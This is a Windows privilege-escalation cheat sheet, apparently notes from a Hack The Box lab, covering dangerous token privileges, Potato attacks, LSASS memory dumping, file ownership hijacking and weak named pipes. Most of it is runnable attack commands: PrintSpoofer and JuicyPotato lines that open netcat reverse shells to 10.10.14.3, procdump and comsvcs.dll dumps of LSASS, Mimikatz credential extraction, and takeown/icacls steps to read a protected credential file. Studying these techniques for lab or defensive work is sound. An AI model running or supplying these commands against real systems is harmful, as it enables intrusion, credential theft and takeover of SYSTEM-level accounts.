# Exploiting User Privileges
**Concept:** Windows users are assigned "Privileges" (Token Rights) that determine what system-level actions they can perform. Some of these are critical and allow direct escalation to `SYSTEM`.
## 1. Enumeration
**Goal:** Identify if the current user holds dangerous privileges.
```powershell
# Description: Check current user privileges
# Syntax: whoami /priv
whoami /priv
```

**Critical Privileges to Watch:**
- `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`: **Critical**. Allows escalation to SYSTEM via Potato exploits.
- `SeDebugPrivilege`: **High**. Allows dumping memory of system processes (LSASS).
- `SeTakeOwnershipPrivilege`: **High**. Allows taking control of any file (read/write access).
- `SeBackupPrivilege` / `SeRestorePrivilege`: **High**. Allows reading/writing any file to "backup" or "restore" it, ignoring ACLs.
## 2. SeImpersonatePrivilege (Potato Attacks)
**Concept:** Accounts like `LocalService` or `NetworkService` often have this. It allows the user to impersonate a token of another user that connects to a process they control. By forcing `SYSTEM` to connect to a rogue Named Pipe (via COM/RPC), we can steal the SYSTEM token.

**Tools:**
- **JuicyPotato:** (Older, works on Server 2016 and earlier).
- **PrintSpoofer:** (Newer, works on Server 2019/2022).
- **RoguePotato:** (Alternative if others fail).
### Execution (PrintSpoofer)
**Scenario:** You have a shell as `IIS APPPOOL\DefaultAppPool` with `SeImpersonatePrivilege`.
```powershell
# Description: Execute Netcat reverse shell as SYSTEM
# Syntax: PrintSpoofer.exe -c "<Command>"
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
### Execution (JuicyPotato)
**Scenario:** Using `xp_cmdshell` on MSSQL (often runs as a Service Account).
```powershell
# Description: Trigger exploit via CLSID to spawn a reverse shell
# Syntax: JuicyPotato.exe -l <ListenPort> -p <Program> -a <Args> -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
## 3. SeDebugPrivilege (Memory Dumping)
**Concept:** Allows the user to debug any process, including `lsass.exe`. We can dump LSASS memory to extract cleartext passwords or NTLM hashes.
### Exploitation
1. **Dump LSASS:** Use `Procdump` (Sysinternals) or `Comsvcs.dll` (Living off the Land).
```powershell
# Method A: Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method B: PowerShell/Comsvcs (Stealthier)
# Find LSASS PID first (tasklist /fi "imagename eq lsass.exe")
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```
2. **Extract Credentials:** Use `Mimikatz` on the dump file (offline or on the host).
```powershell
# Mimikatz commands
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
## 4. SeTakeOwnershipPrivilege (File Hijacking)
**Concept:** Allows you to take ownership of any file, even if you don't have read access. Once you are the owner, you can modify the ACL (permissions) to grant yourself Full Control.
### Exploitation Flow
**Scenario:** `C:\Department Shares\Private\IT\cred.txt` is locked.
1. **Take Ownership:**
```powershell
takeown /f "C:\Department Shares\Private\IT\cred.txt"
```
1. **Grant Permissions:** Modify the ACL to give your user (`htb-student`) full access.
```powershell
icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F
```
2. **Read File:**
```powershell
type "C:\Department Shares\Private\IT\cred.txt"
```

**Strategic Targets:**
- `web.config` (Database strings).
- `%WINDIR%\repair\sam` & `system` (Password hashes).
- Service binaries (replace a service executable to get SYSTEM execution).
# Named Pipe Exploitation
**Concept:** Named Pipes are mechanisms for inter-process communication. If a pipe created by a privileged process has weak permissions (e.g., `Everyone: Write`), an attacker can manipulate it.
## 1. Enumeration
**Goal:** Find pipes with weak permissions.
```powershell
# Description: List pipes using PowerShell
gci \\.\pipe\
```

**Permission Check (AccessChk):**
```powershell
accesschk.exe /accepteula -w \pipe\WindscribeService -v
```
- **Vulnerable:** Look for `RW Everyone`, `RW Users`, or `RW Authenticated Users`.
## 2. Exploitation (Windscribe Example)
**Scenario:** A VPN service creates a named pipe that accepts commands from any user. By sending a malicious payload to the pipe, the service (running as SYSTEM) executes it.
**Technique:** Often requires a specific exploit binary tailored to the service protocol.
- **Logic:** Connect to pipe → Send constructed OpCode/Payload → Service Executes as SYSTEM.